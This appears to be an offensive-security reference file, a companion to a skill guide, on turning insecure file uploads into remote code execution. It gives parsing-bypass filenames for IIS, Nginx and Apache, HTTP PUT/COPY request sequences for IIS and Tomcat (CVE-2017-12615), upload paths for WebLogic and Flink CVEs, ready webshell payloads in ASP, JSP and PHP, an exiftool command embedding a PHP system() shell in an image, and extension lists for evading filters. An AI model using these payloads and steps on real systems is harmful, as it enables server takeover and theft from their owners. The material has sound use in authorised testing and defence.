# Upload Insecure Files — Extended Scenarios & Real-World Cases

> Companion to [SKILL.md](./SKILL.md). Contains parsing vulnerabilities, PUT method attacks, and CVE case studies.

---

## 1. Web Server Parsing Vulnerabilities

Parsing vulnerabilities cause web servers to execute uploaded files as code despite having "safe" extensions:

### IIS Parsing

| Technique | Example | Mechanism |
|---|---|---|
| Directory parsing | Upload to `x.asp/` directory | IIS 6 treats files in `.asp` directories as ASP |
| Semicolon truncation | `shell.asp;.jpg` | IIS 6 truncates at `;` → executes as ASP |
| Unicode space | `shell.asp%20` | IIS ignores trailing encoded space |

### Nginx Parsing (CGI misconfiguration)

```text
# Upload: avatar.jpg (containing PHP code in EXIF or appended)
# Access: /uploads/avatar.jpg/.php
# Or: /uploads/avatar.jpg%00.php (null byte, older versions)
```

Caused by `cgi.fix_pathinfo=1` in php.ini + incorrect Nginx `location` config.

### Apache Parsing

| Technique | Example | Mechanism |
|---|---|---|
| Multiple extensions | `shell.php.jpg` | If `AddHandler php-script .php`, Apache processes `.php` anywhere in name |
| Newline bypass (CVE-2017-15715) | `shell.php\n` (`0x0A`) | `<FilesMatch>` regex uses `$` which matches before `\n` |
| `.htaccess` upload | Upload `.htaccess` with `AddType application/x-httpd-php .jpg` | All `.jpg` files execute as PHP |

### Exploitation Flow

```
1. Upload file with parsing-vulnerable name: shell.php.jpg
2. Server stores it (passes extension validation for "jpg")
3. Access the file URL
4. Web server parses it as PHP due to parsing vulnerability → RCE
```

---

## 2. PUT Method Exploitation

### IIS PUT + COPY/MOVE

IIS with WebDAV and write permissions allows uploading via PUT, then renaming:

```bash
# Step 1: PUT a text file (allowed)
PUT /test.txt HTTP/1.1
Content-Type: text/plain

<%eval request("cmd")%>

# Step 2: COPY/MOVE to .asp extension
COPY /test.txt HTTP/1.1
Destination: /shell.asp

# Step 3: Access shell
GET /shell.asp?cmd=whoami
```

### Tomcat PUT (CVE-2017-12615)

When Tomcat's `readonly` parameter is `false` in `web.xml`:

```bash
# Direct PUT is blocked for .jsp
PUT /shell.jsp HTTP/1.1
→ 403 Forbidden

# Bypass with trailing slash:
PUT /shell.jsp/ HTTP/1.1
Content-Type: application/octet-stream

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
→ 201 Created

# Or Windows-style:
PUT /shell.jsp::$DATA HTTP/1.1
```

---

## 3. CVE Case: WebLogic Arbitrary File Upload (CVE-2018-2894)

WebLogic's Web Service Test Page allows unauthenticated file upload:

```
# Endpoint (when test page is enabled):
/ws_utc/config.do
# Or: /ws_utc/resources/setting/keystore

# Upload JSP webshell as a "keystore" file
# The file is stored in a web-accessible path
# Access: /ws_utc/css/config/keystore/TIMESTAMP_FILENAME.jsp
```

---

## 4. CVE Case: Apache Flink File Upload (CVE-2020-17518)

Flink's REST API allows uploading JARs with path traversal in the filename:

```bash
# Upload with crafted filename containing path traversal:
curl -X POST http://TARGET:8081/jars/upload \
  -F 'jarfile=@shell.jar;filename=../../../../../../tmp/shell.jar'
```

---

## 5. File Upload + Parsing Vulnerability Chain

The most reliable upload-to-RCE chain combines both:

```
1. Upload: image with PHP code embedded (e.g., in EXIF Comment)
   exiftool -Comment='<?php system($_GET["c"]); ?>' photo.jpg

2. Exploit parsing vulnerability to execute as PHP:
   - Nginx: /uploads/photo.jpg/.php
   - Apache: rename to photo.php.jpg
   - IIS: upload to x.asp/ directory

3. Access with command parameter:
   GET /uploads/photo.jpg/.php?c=id
```

---

## 6. Extension Bypass Reference

```text
# PHP alternatives:
.php  .php3  .php4  .php5  .phtml  .pht  .phps  .phar

# ASP alternatives:
.asp  .aspx  .asa  .cer  .cdx  .ashx  .asmx

# JSP alternatives:
.jsp  .jspx  .jsw  .jsv  .jspf

# Case variations:
.pHp  .PhP  .PHP  .Asp  .aSp

# Double extensions:
.php.jpg  .php.png  .php.txt  .asp;.jpg

# Null byte (legacy):
.php%00.jpg  .php\x00.jpg
```
